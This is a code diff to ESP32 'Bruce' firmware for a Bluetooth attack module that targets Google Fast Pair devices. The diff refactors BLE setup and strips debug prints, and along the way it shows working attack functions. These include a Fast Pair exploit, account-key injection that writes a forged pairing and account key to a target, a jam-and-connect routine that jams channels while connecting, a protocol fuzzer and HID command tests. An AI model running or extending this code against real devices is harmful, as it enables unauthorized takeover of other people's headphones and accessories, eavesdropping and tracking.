@@ -18,13 +18,26 @@ extern volatile int tftHeight;
 AudioCommandService audioCmd;
 FastPairCrypto crypto;
 
+bool g_bleInitialized = false;
+
+bool initializeBLEOnce(const char* deviceName = "Bruce-WP") {
+    static bool initialized = false;
+    if (!initialized) {
+        NimBLEDevice::init(deviceName);
+        NimBLEDevice::setPower(ESP_PWR_LVL_P9);
+        NimBLEDevice::setSecurityAuth(false, false, false);
+        NimBLEDevice::setMTU(250);
+        initialized = true;
+        g_bleInitialized = true;
+    }
+    return true;
+}
+
 class MyClientCallback : public NimBLEClientCallbacks {
     void onConnect(NimBLEClient* pClient) {
-        Serial.println("Connected");
     }
     
     void onDisconnect(NimBLEClient* pClient) {
-        Serial.println("Disconnected");
     }
     
     bool onConnParamsUpdateRequest(NimBLEClient* pClient, const ble_gap_upd_params* params) {
@@ -36,7 +49,6 @@ class MyClientCallback : public NimBLEClientCallbacks {
     }
     
     void onAuthenticationComplete(ble_gap_conn_desc* desc) {
-        Serial.println("Authentication complete");
     }
 };
 
@@ -57,16 +69,11 @@ class PairingCaptureCallback : public NimBLEScanCallbacks {
                 uint16_t mfg_id = (mfg[1] << 8) | mfg[0];
                 
                 if(mfg_id == 0x00E0 || mfg_id == 0x2C00) {
-                    Serial.printf("\nFound FastPair device: %s\n", 
-                                  advertisedDevice->getName().c_str());
-                    
                     if(mfg.length() >= 4) {
                         uint8_t msg_type = mfg[2];
                         if(msg_type == 0x00) {
-                            Serial.println("Phone detected!");
                             g_capturedPhoneAddr = advertisedDevice->getAddress();
                         } else if(msg_type == 0x10 || msg_type == 0x20) {
-                            Serial.println("Target detected!");
                             g_capturedTargetAddr = advertisedDevice->getAddress();
                         }
                     }
@@ -80,40 +87,34 @@ PairingCaptureCallback pairingCaptureCB;
 
 bool safeConnectWithRetry(NimBLEAddress target, int maxRetries, NimBLEClient** outClient) {
     for(int attempt = 0; attempt < maxRetries; attempt++) {
-        Serial.printf("[CONNECT] Attempt %d/%d to %s\n", attempt+1, maxRetries, target.toString().c_str());
-        
         size_t freeHeap = esp_get_free_heap_size();
-        if(freeHeap < 20000) {
-            Serial.printf("Low memory: %d bytes\n", freeHeap);
+        if(freeHeap < 30000) {
             delay(500);
             continue;
         }
         
         NimBLEClient* pClient = NimBLEDevice::createClient();
         if(!pClient) {
-            Serial.println("Failed to create client");
             delay(1000);
             continue;
         }
         
         pClient->setClientCallbacks(&clientCB);
-        pClient->setConnectTimeout(8);
+        pClient->setConnectTimeout(5);
         
         if(pClient->connect(target, true)) {
             if(pClient->isConnected()) {
-                Serial.println("Connection successful");
                 *outClient = pClient;
                 delay(200);
                 return true;
             }
         }
         
-        Serial.printf("Connection failed\n");
         if(pClient->isConnected()) {
             pClient->disconnect();
         }
         NimBLEDevice::deleteClient(pClient);
-        delay(800);
+        delay(1000);
     }
     
     return false;
@@ -400,15 +401,7 @@ void showSuccessMessage(const char* message) {
 }
 
 bool initBLEIfNeeded(const char* deviceName) {
-    static bool initialized = false;
-    if (!initialized) {
-        NimBLEDevice::init(deviceName);
-        NimBLEDevice::setPower(ESP_PWR_LVL_P9);
-        NimBLEDevice::setSecurityAuth(false, false, false);
-        NimBLEDevice::setMTU(250);
-        initialized = true;
-    }
-    return true;
+    return initializeBLEOnce(deviceName);
 }
 
 bool requireSimpleConfirmation(const char* message) {
@@ -470,7 +463,6 @@ bool fastPairExploit(NimBLEAddress target) {
     
     NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
     if(!pService) {
-        Serial.println("No FastPair service found");
         pClient->disconnect();
         NimBLEDevice::deleteClient(pClient);
         showErrorMessage("No FastPair service");
@@ -571,8 +563,6 @@ bool fastPairExploit(NimBLEAddress target) {
 }
 
 bool attemptAccountKeyInjection(NimBLEAddress target, CapturedKeys& keys) {
-    Serial.println("\n=== ATTEMPTING ACCOUNT KEY INJECTION ===");
-    
     NimBLEClient* pClient = nullptr;
     if(!safeConnectWithRetry(target, 2, &pClient)) {
         return false;
@@ -598,15 +588,12 @@ bool attemptAccountKeyInjection(NimBLEAddress target, CapturedKeys& keys) {
     
     if(keys.keys_captured) {
         memcpy(&seeker_hello[2], keys.phone_public_key, 65);
-        Serial.println("Using captured phone public key");
     } else {
         crypto.generateValidKeyPair(keys.phone_public_key, (size_t*)65);
         memcpy(&seeker_hello[2], keys.phone_public_key, 65);
-        Serial.println("Using generated phone public key");
     }
     
     if(!pKbpChar->writeValue(seeker_hello, 67, true)) {
-        Serial.println("Failed to send seeker hello");
         pClient->disconnect();
         NimBLEDevice::deleteClient(pClient);
         return false;
@@ -617,7 +604,6 @@ bool attemptAccountKeyInjection(NimBLEAddress target, CapturedKeys& keys) {
     std::string response = pKbpChar->readValue();
     if(response.length() >= 65) {
         memcpy(keys.target_public_key, response.data() + 2, 65);
-        Serial.println("Captured target's public key");
     }
     
     uint8_t pairing_complete[34] = {0};
@@ -633,9 +619,7 @@ bool attemptAccountKeyInjection(NimBLEAddress target, CapturedKeys& keys) {
     pairing_complete[33] = 0x00;
     
     if(!pKbpChar->writeValue(pairing_complete, 34, true)) {
-        Serial.println("Failed to send pairing complete");
     } else {
-        Serial.println("Sent pairing complete");
     }
     
     delay(200);
@@ -657,7 +641,6 @@ bool attemptAccountKeyInjection(NimBLEAddress target, CapturedKeys& keys) {
             delay(100);
             std::string ack = pAccountChar->readValue();
             if(ack.length() > 0) {
-                Serial.println("ACCOUNT KEY INJECTED!");
                 memcpy(keys.account_key, account_key, 16);
                 keys.keys_captured = true;
                 showSuccessMessage("KEY INJECTION ATTEMPTED!");
@@ -836,7 +819,6 @@ void runProtocolFuzzer(NimBLEAddress target) {
         
         if(pChar->writeValue(testCases[i], sizeof(testCases[i]), false)) {
             tft.print("ACCEPTED (BUG!)");
-            Serial.printf("BUG: Device accepted malformed packet %d\n", i);
         } else {
             tft.print("rejected");
         }
@@ -864,14 +846,7 @@ String selectTargetFromScan(const char* title) {
     tft.setCursor(20, 60);
     tft.print("Initializing scanner...");
     
-    static bool bleInitialized = false;
-    if(!bleInitialized) {
-        NimBLEDevice::init("TargetScanner");
-        bleInitialized = true;
-    }
-    
-    NimBLEDevice::setPower(ESP_PWR_LVL_P9);
-    NimBLEDevice::setSecurityAuth(false, false, false);
+    initializeBLEOnce("Bruce-WP");
     
     NimBLEScan* pBLEScan = NimBLEDevice::getScan();
     if(!pBLEScan) {
@@ -881,15 +856,16 @@ String selectTargetFromScan(const char* title) {
     
     pBLEScan->clearResults();
     pBLEScan->setActiveScan(true);
-    pBLEScan->setInterval(67);
-    pBLEScan->setWindow(33);
+    pBLEScan->setInterval(97);
+    pBLEScan->setWindow(48);
     pBLEScan->setDuplicateFilter(true);
+    pBLEScan->setMaxResults(50);
     
     tft.fillRect(20, 60, tftWidth - 40, 40, bruceConfig.bgColor);
     tft.setCursor(20, 60);
     tft.print("Scanning for 15s...");
     
-    pBLEScan->start(15, false);
+    NimBLEScanResults foundDevices = pBLEScan->start(15, false);
     
     struct ScanDevice {
         String name;
@@ -900,7 +876,6 @@ String selectTargetFromScan(const char* title) {
     };
     std::vector<ScanDevice> devices;
     
-    NimBLEScanResults foundDevices = pBLEScan->getResults();
     for(int i = 0; i < foundDevices.getCount(); i++) {
         const NimBLEAdvertisedDevice* device = foundDevices.getDevice(i);
         if(!device) continue;
@@ -1021,8 +996,6 @@ String selectTargetFromScan(const char* title) {
 }
 
 bool jamAndConnectEnhanced(NimBLEAddress target) {
-    Serial.println("\n=== JAM & CONNECT ATTACK ===");
-    
     showDeviceInfoScreen("JAM & CONNECT", 
         {"Starting jam...", 
          "Jamming for 8 seconds",
@@ -1035,8 +1008,6 @@ bool jamAndConnectEnhanced(NimBLEAddress target) {
     bool connected = false;
     unsigned long startTime = millis();
     
-    Serial.println("Starting jam/connect loop...");
-    
     while(millis() - startTime < 8000 && !connected) {
         updateJammerChannel();
         
@@ -1044,7 +1015,6 @@ bool jamAndConnectEnhanced(NimBLEAddress target) {
         if(safeConnectWithRetry(target, 1, &tempClient)) {
             connected = true;
             pClient = tempClient;
-            Serial.println("Connected while jamming!");
             break;
         }
         
@@ -1058,7 +1028,6 @@ bool jamAndConnectEnhanced(NimBLEAddress target) {
         
         NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
         if(pService) {
-            Serial.println("FastPair service accessible after jam!");
             showAdaptiveMessage("FastPair accessible!", "", "", "", TFT_GREEN, false, true);
         }
         
@@ -1232,8 +1201,9 @@ void whisperPairMenu() {
     std::vector<Option> options;
     returnToMenu = false;
     
+    initializeBLEOnce("Bruce-WP");
+    
     options.push_back({"[FastPair Exploit]", []() {
-        initBLEIfNeeded("Bruce-WP");
         String targetInfo = selectTargetFromScan("EXPLOIT TARGET");
         if(targetInfo.isEmpty()) return;
         NimBLEAddress target = parseAddress(targetInfo);
@@ -1247,7 +1217,6 @@ void whisperPairMenu() {
     }});
     
     options.push_back({"[Test Write Access]", []() {
-        initBLEIfNeeded("Bruce-WP");
         String targetInfo = selectTargetFromScan("TEST TARGET");
         if(targetInfo.isEmpty()) return;
         NimBLEAddress target = parseAddress(targetInfo);
@@ -1288,7 +1257,6 @@ void whisperPairMenu() {
     }});
     
     options.push_back({"[Protocol Fuzzer]", []() {
-        initBLEIfNeeded("Bruce-WP");
         String targetInfo = selectTargetFromScan("SELECT TARGET");
         if(targetInfo.isEmpty()) return;
         NimBLEAddress target = parseAddress(targetInfo);
@@ -1306,7 +1274,6 @@ void whisperPairMenu() {
     }});
     
     options.push_back({"[Test HID Commands]", []() {
-        initBLEIfNeeded("Bruce-WP");
         String targetInfo = selectTargetFromScan("HID TARGET");
         if(targetInfo.isEmpty()) return;
         NimBLEAddress target = parseAddress(targetInfo);
